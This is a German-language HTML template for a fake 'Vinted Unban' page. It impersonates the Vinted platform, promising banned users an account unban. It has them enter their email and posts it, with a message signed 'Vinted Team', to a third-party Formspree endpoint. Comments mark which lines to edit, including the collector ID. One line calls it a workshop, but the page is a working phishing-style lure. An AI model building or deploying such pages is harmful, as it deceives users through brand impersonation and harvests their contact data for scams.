<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Vinted Unban</title> <!-- ✏️ ZEILE 5: Browser-Tab Titel -->
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: system-ui, sans-serif; background: #C0392B; }
    .screen {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 3rem 2rem;
      text-align: center;
    }
    .screen h1 { font-size: 2.4rem; font-weight: 700; color: #fff; margin-bottom: 1rem; line-height: 1.3; }
    .screen p { font-size: 1.1rem; color: rgba(255,255,255,0.88); max-width: 540px; line-height: 1.75; margin-bottom: 2.5rem; }
    .btn { background: #fff; color: #A32D2D; font-size: 1.05rem; font-weight: 700; padding: 15px 40px; border-radius: 10px; border: none; cursor: pointer; }
    .btn:hover { background: #f0f0f0; }
    .app-screen { display: none; min-height: 100vh; background: #f5f5f5; flex-direction: column; align-items: center; justify-content: center; padding: 2rem; }
    .app-screen.active { display: flex; }
    .app-card { background: #fff; border-radius: 16px; box-shadow: 0 4px 24px rgba(0,0,0,0.10); padding: 2.5rem 2rem; max-width: 420px; width: 100%; text-align: center; }
    .logo { width: 64px; height: 64px; background: #C0392B; border-radius: 16px; margin: 0 auto 1.2rem; display: flex; align-items: center; justify-content: center; font-size: 2rem; color: #fff; font-weight: 700; }
    .app-card h2 { font-size: 1.4rem; font-weight: 700; color: #1a1a1a; margin-bottom: 0.4rem; }
    .app-card .subtitle { font-size: 14px; color: #888; margin-bottom: 1.5rem; }
    .app-card input { width: 100%; padding: 13px 14px; margin-bottom: 1rem; border-radius: 10px; border: 1.5px solid #ddd; font-size: 15px; color: #1a1a1a; }
    .app-card input:focus { outline: none; border-color: #C0392B; }
    .send-btn { background: #C0392B; color: #fff; border: none; padding: 13px 0; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; width: 100%; }
    .send-btn:hover { background: #a93226; }
    .thanks { font-size: 15px; color: #1a1a1a; line-height: 1.9; }
    .check { width: 56px; height: 56px; background: #eafaf1; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 1rem; font-size: 1.8rem; }
    .footer { background: #1a1a1a; color: rgba(255,255,255,0.4); text-align: center; padding: 1rem; font-size: 12px; }
  </style>
</head>
<body>

  <!-- STARTSEITE -->
  <div class="screen" id="homeScreen">
    <h1>Vinted Unban</h1> <!-- ✏️ ZEILE 44: Haupttitel -->
    <p>Willkommen in unserem Workshop. Bitte laden Sie unsere App herunter und melden Sie sich an.</p> <!-- ✏️ ZEILE 45: Beschreibungstext -->
    <button class="btn" onclick="loadApp()">App laden</button>
  </div>

  <!-- APP (wird nach Klick geladen) -->
  <div class="app-screen" id="appScreen">
    <div class="app-card" id="appCard">
      <div class="logo">E</div>
      <h2>Vinted Unban</h2>
      <p class="subtitle">Bitte melden Sie sich mit Ihrer E-Mail an.</p>
      <input type="email" id="emailInput" placeholder="ihre@email.de" />
      <button class="send-btn" onclick="handleSend()">Senden</button>
    </div>
  </div>

  <div class="footer">Vinted Unbanner · v1.0.0 · kostenlos</div>

  <script>
    function loadApp() {
      document.getElementById('homeScreen').style.display = 'none';
      document.getElementById('appScreen').classList.add('active');
    }

    async function handleSend() {
      const email = document.getElementById('emailInput').value;
      if (!email || !email.includes('@')) {
        alert('Bitte geben Sie eine gültige E-Mail-Adresse ein.');
        return;
      }

      // ✏️ ZEILE 74: Betreff der E-Mail
      const betreff = 'Vinted Unbanner';

      // ✏️ ZEILEN 77-88: Kompletter Text der E-Mail – hier alles ändern!
      const nachricht = `Hallo,

Account Unban
Hier sind alle wichtigen Infos:
Your Vinted Account Unban

Wir freuen uns auf Sie!

Mit freundlichen Grüßen,
Vinted Team`;

      // ✏️ ZEILE 91: XXXXXXXX durch deine Formspree-ID ersetzen
      await fetch('https://formspree.io/f/xjgjggol', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: email, subject: betreff, message: nachricht })
      });

      // ✏️ ZEILE 98-101: Bestätigungstext nach dem Absenden
      document.getElementById('appCard').innerHTML = `
        <div class="thanks">
          <div class="check">✓</div>
          <strong>Vielen Dank!</strong><br><br>
          Alle weiteren Infos finden Sie<br>in Ihrem E-Mail-Postfach.
        </div>
      `;
    }
  </script>

</body>
</html>
